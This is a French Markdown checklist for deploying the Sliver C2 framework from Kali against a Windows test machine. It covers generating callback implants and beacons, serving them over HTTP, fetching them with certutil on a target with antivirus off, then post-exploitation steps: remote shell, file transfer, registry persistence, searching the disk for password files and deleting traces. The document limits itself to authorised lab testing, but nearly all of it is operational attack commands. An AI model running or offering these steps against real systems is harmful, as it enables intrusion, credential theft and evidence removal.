# ✅ CHECKLIST SILVER C2 - SUIVI DES ÉTAPES

## 📋 PHASE 1: PRÉPARATION
- [ ] **ÉTAPE 1** : Mise à jour Kali → `sudo apt update && sudo apt upgrade -y`
- [ ] **ÉTAPE 2** : Installation Silver C2 → `sudo apt install sliver -y`
- [ ] **ÉTAPE 3** : Vérification → `sliver-server version` + `sliver-client --help`

## 🚀 PHASE 2: DÉMARRAGE
- [ ] **ÉTAPE 4** : Noter votre IP Kali → `ip addr show`
  - **Mon IP**: ________________
- [ ] **ÉTAPE 5** : Serveur → `sudo sliver-server` (Terminal 1)
- [ ] **ÉTAPE 6** : Client → `sliver-client` (Terminal 2)

## 🎯 PHASE 3: LISTENERS
- [ ] **ÉTAPE 7** : Listener mTLS → `mtls --lport 443`
- [ ] **ÉTAPE 8** : Vérification → `jobs`

## 💾 PHASE 4: PAYLOADS
- [ ] **ÉTAPE 9** : Répertoire → `mkdir ~/silver-payloads && cd ~/silver-payloads`
- [ ] **ÉTAPE 10** : Payload Windows → 
  ```bash
  generate --mtls [VOTRE_IP]:443 --os windows --arch amd64 --format exe --save /home/kali/silver-payloads/payload.exe
  ```
- [ ] **ÉTAPE 11** : Beacon → 
  ```bash
  generate beacon --mtls [VOTRE_IP]:443 --os windows --arch amd64 --format exe --jitter 30s --interval 60s --save /home/kali/silver-payloads/beacon.exe
  ```
- [ ] **ÉTAPE 12** : Vérification → `ls -la ~/silver-payloads/`

## 🌐 PHASE 5: TRANSFERT
- [ ] **ÉTAPE 13** : Serveur HTTP → `python3 -m http.server 8080` (Terminal 3)
- [ ] **ÉTAPE 14** : Test accès → `curl -I http://[VOTRE_IP]:8080/payload.exe`

## 🎯 PHASE 6: TEST CIBLE
- [ ] **ÉTAPE 15** : VM Windows préparée (antivirus désactivé)
- [ ] **ÉTAPE 16** : Téléchargement → 
  ```cmd
  certutil -urlcache -split -f http://[VOTRE_IP]:8080/payload.exe payload.exe
  ```
- [ ] **ÉTAPE 17** : Exécution → `.\payload.exe` (CIBLE UNIQUEMENT!)
- [ ] **ÉTAPE 18** : Vérification connexion → `sessions`

## 🔥 PHASE 7: POST-EXPLOITATION
- [ ] **ÉTAPE 19** : Interaction → `use [ID_SESSION]`
- [ ] **ÉTAPE 20** : Reconnaissance → `info`, `whoami`, `pwd`, `ls`
- [ ] **ÉTAPE 21** : Shell → `shell`
- [ ] **ÉTAPE 22** : Transfert fichiers → `download` / `upload`

## 🔍 PHASE 8: TECHNIQUES AVANCÉES
- [ ] **ÉTAPE 23** : Énumération → `execute ipconfig /all`, `execute netstat -an`
- [ ] **ÉTAPE 24** : Test persistence → `execute reg add ...`
- [ ] **ÉTAPE 25** : Recherche fichiers → `execute dir C:\ /s /b | findstr password`

## 🧹 PHASE 9: NETTOYAGE
- [ ] **ÉTAPE 26** : Supprimer traces → `execute reg delete ...`, `execute del ...`
- [ ] **ÉTAPE 27** : Fermer session → `sessions -k [ID]` ou `exit`
- [ ] **ÉTAPE 28** : Arrêt Silver → `jobs -k 1` + `exit` + Ctrl+C serveur

---

## 📝 NOTES PERSONNELLES

**Adresse IP Kali**: ____________________

**ID Session active**: ____________________

**Problèmes rencontrés**:
- 
- 
- 

**Commandes qui ont bien fonctionné**:
- 
- 
- 

---

## 🆘 AIDE RAPIDE

### Commandes essentielles Silver C2:
```bash
# Gestion sessions
sessions                 # Lister
sessions -i [ID]        # Interagir
use [ID]               # Utiliser
background             # Arrière-plan

# Dans une session
info                   # Infos système
whoami                 # Utilisateur
pwd                    # Répertoire
ls                     # Fichiers
ps                     # Processus
shell                  # Shell interactif
download [src] [dst]   # Télécharger
upload [src] [dst]     # Uploader
execute [cmd]          # Commande
```

### Listeners:
```bash
jobs                   # Lister listeners
mtls --lport 443      # Listener mTLS
http --lport 80       # Listener HTTP
```

### Génération payloads:
```bash
generate --mtls IP:443 --os windows --format exe --save payload.exe
generate beacon --mtls IP:443 --os windows --format exe --save beacon.exe
implants              # Voir payloads générés
```

---

## 🔴 SÉCURITÉ - RAPPELS IMPORTANTS

- ✅ **UNIQUEMENT** environnement de test
- ✅ **TOUJOURS** autorisation écrite
- ✅ **NETTOYER** après chaque test  
- ❌ **JAMAIS** sur systèmes de production
- ❌ **JAMAIS** sans autorisation

---

**Date du test**: ____________________
**Testeur**: ____________________
**Environnement**: ____________________

✅ **Test terminé avec succès** ☐ **Nettoyage effectué** ☐